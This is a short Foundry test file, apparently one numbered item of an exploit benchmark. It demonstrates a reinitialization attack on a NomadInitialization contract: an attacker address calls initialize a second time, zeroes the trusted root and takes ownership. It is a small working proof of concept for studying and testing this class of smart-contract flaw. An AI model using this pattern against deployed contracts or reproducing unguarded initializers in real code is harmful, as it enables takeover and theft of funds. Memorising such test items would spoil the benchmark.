// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract Exploit_015_nomad_initialization is Test {
    function testExploit_ReinitializeToZeroRootAndAttackerOwner() public {
        NomadInitialization n = new NomadInitialization();
        n.initialize(bytes32(uint256(1)), address(this));

        address attacker = address(0xBEEF);
        vm.prank(attacker);
        n.initialize(bytes32(0), attacker);

        assertEq(n.trustedRoot(), bytes32(0), "trusted root overwritten to zero");
        assertEq(n.owner(), attacker, "owner overwritten");
    }
}
